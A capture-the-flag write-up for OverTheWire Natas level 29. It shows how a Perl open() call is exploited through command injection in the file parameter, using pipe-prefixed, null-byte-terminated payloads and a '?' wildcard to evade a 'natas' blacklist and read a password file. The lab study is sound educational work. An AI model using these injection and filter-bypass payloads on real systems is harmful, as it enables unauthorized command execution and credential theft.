# OverTheWire Natas level 28 - 29

**Objective**

*The goal of Natas 29 is to retrieve the password for the next level by exploiting a Perl command injection vulnerability.*

- The application allows the user to select a file through the file parameter. The server then uses this value when opening a file.

- The interesting part is that the application does not safely handle shell metacharacters, allowing us to inject additional commands.

### Finding Command Injection

The application uses a file parameter:

```
index.pl?file=<input>
```

- I first tested whether shell commands could be injected using `|`.

For example:

`|ls`

- However, this did not work as expected.

- After experimenting with the input, I found that the injected command needs to be null terminated.

The following payload works:

`|ls%00`

- The %00 represents a null byte.

The complete request is:

`index.pl?file=|ls%00`


This successfully executes ls and displays the contents of the web directory.

At this point, we know that command injection is possible.


### Understanding the Filter

The application checks whether the supplied input contains the string:

<natas>

- If it does, the application prints:

<meeeeeep!>

and does not process the input.

Therefore, a direct attempt such as:

`|cat /etc/natas_webpass/natas30`

will fail because the input contains natas.


### Constructing the Payload

The original target is:

`/etc/natas_webpass/natas30`

We replace one character in each occurrence of natas with `?`:

`/etc/n?tas_webpass/n?tas30`


The complete command injection becomes:

`|cat /etc/n?tas_webpass/n?tas30 %00`


The %00 is required because the application expects the injected value to be null terminated.

### Final Request

The resulting request is conceptually:

`index.pl?file=|cat /etc/n?tas_webpass/n?tas30%00`

The application does not detect the string natas, because the input actually contains:

<n?tas>

The shell expands the wildcards to the matching filenames:

<n?tas_webpass>

and:

<n?tas30>


The command therefore resolves to:

`cat /etc/natas_webpass/natas30`

and the contents of the password file are returned.



**Key Takeaways**

The main vulnerabilities in this level are:

### Perl command injection

The user-controlled `file` parameter is passed to:
```
open(FD, "$f.txt");
```

without properly preventing command injection.

This allows shell syntax such as:

`|`

to be used.

### Weak blacklist filtering

The application only checks whether the input contains:

<natas>

A blacklist like this can often be bypassed.

### Shell wildcard expansion

The `?` wildcard allows us to refer to filenames without explicitly writing the filtered string:

<natas>

becomes:

<n?tas>

### Null-byte termination

The `%00` character was necessary to terminate the injected input and successfully execute the command.
